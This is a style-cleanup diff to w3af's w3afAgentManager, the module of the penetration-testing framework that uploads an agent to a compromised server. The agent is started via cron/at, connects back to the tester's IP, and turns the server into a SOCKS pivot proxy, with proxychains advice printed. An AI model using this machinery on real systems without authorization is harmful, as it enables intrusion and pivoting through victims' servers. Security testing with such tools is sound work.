@@ -44,6 +44,7 @@ class w3afAgentManager(Process):
     This is a Process, so the entry point is start() , which will
     internally call the run() method.
     """
+
     def __init__(self, exec_method, ip_address, socks_port=1080):
         Process.__init__(self)
         self.daemon = True
@@ -61,7 +62,7 @@ class w3afAgentManager(Process):
         A wrapper for executing commands
         """
         om.out.debug('Executing: ' + command)
-        response = apply(self._exec_method, (command,))
+        response = self._exec_method(*(command,))
         om.out.debug('"' + command + '" returned: ' + response)
         return response
 
@@ -75,7 +76,8 @@ class w3afAgentManager(Process):
         try:
             interpreter, client_code, extension = self._select_client()
         except BaseFrameworkException:
-            om.out.error('Failed to find a suitable w3afAgentClient for the remote server.')
+            om.out.error(
+                'Failed to find a suitable w3afAgentClient for the remote server.')
         else:
 
             #
@@ -106,9 +108,11 @@ class w3afAgentManager(Process):
                 transferHandler = ptf.get_transfer_handler(inbound_port)
 
                 if not transferHandler.can_transfer():
-                    raise BaseFrameworkException('Can\'t transfer w3afAgent client to remote host, can_transfer() returned False.')
+                    raise BaseFrameworkException(
+                        'Can\'t transfer w3afAgent client to remote host, can_transfer() returned False.')
                 else:
-                    #    Let the user know how much time it will take to transfer the file
+                    # Let the user know how much time it will take to transfer
+                    # the file
                     estimatedTime = transferHandler.estimate_transfer_time(
                         len(client_code))
                     om.out.debug('The w3afAgent client transfer will take "' +
@@ -118,30 +122,43 @@ class w3afAgentManager(Process):
                     filename += '.' + extension
 
                     #    Upload the file and check integrity
-                    om.out.console('Starting w3afAgent client upload, remote filename is: "%s" ...' % filename)
+                    om.out.console(
+                        'Starting w3afAgent client upload, remote filename is: "%s" ...' %
+                        filename)
 
                     upload_success = transferHandler.transfer(
                         client_code, filename)
                     if not upload_success:
-                        raise BaseFrameworkException('The w3afAgent client failed to upload. Remote file hash does NOT match.')
+                        raise BaseFrameworkException(
+                            'The w3afAgent client failed to upload. Remote file hash does NOT match.')
 
                     om.out.console('Finished w3afAgent client upload!')
 
-                    #    And now start the w3afAgentClient on the remote server using cron / at
-                    self._delayedExecution(interpreter + ' ' + filename + ' ' + self._ip_address + ' ' + str(inbound_port))
+                    # And now start the w3afAgentClient on the remote server
+                    # using cron / at
+                    self._delayedExecution(
+                        interpreter +
+                        ' ' +
+                        filename +
+                        ' ' +
+                        self._ip_address +
+                        ' ' +
+                        str(inbound_port))
 
                     #
                     #    This checks if the remote server connected back to the agent_server
                     #
                     if not agent_server.is_working():
-                        om.out.console('Something went wrong, the w3afAgent client failed to connect back.')
+                        om.out.console(
+                            'Something went wrong, the w3afAgent client failed to connect back.')
                     else:
                         msg = 'A SOCKS proxy is listening on %s:%s' % (
                             self._ip_address, self._socks_port)
                         msg += ' , all connections made through this daemon will be routed '
                         msg += ' through the compromised server. We recommend using the proxychains tool '
                         msg += ' ("apt-get install proxychains") to route connections through the proxy, the '
-                        msg += ' proxy configuration should look like "socks4    %s     %s"' % (self._ip_address, self._socks_port)
+                        msg += ' proxy configuration should look like "socks4    %s     %s"' % (
+                            self._ip_address, self._socks_port)
                         om.out.console(msg)
 
     def is_working(self):
@@ -180,8 +197,13 @@ class w3afAgentManager(Process):
         python = python.strip()
 
         if python.startswith('/'):
-            client = os.path.join(ROOT_PATH, 'core', 'controllers', 'w3afAgent',
-                                  'client', 'w3afAgentClient.py')
+            client = os.path.join(
+                ROOT_PATH,
+                'core',
+                'controllers',
+                'w3afAgent',
+                'client',
+                'w3afAgentClient.py')
             file_content = file(client).read()
             extension = 'py'
             interpreter = python
@@ -201,7 +223,7 @@ class w3afAgentManager(Process):
 
         try:
             s.bind(('0.0.0.0', port))
-        except:
+        except BaseException:
             #    socket.error: [Errno 13] Permission denied
             #    Or some similar error
             return False
@@ -213,7 +235,7 @@ class w3afAgentManager(Process):
         es = extrusionScanner(self._exec_method)
         try:
             inbound_port = es.get_inbound_port()
-        except Exception, e:
+        except Exception as e:
 
             om.out.error('The extrusion scan failed.')
             om.out.error('Error: ' + str(e))
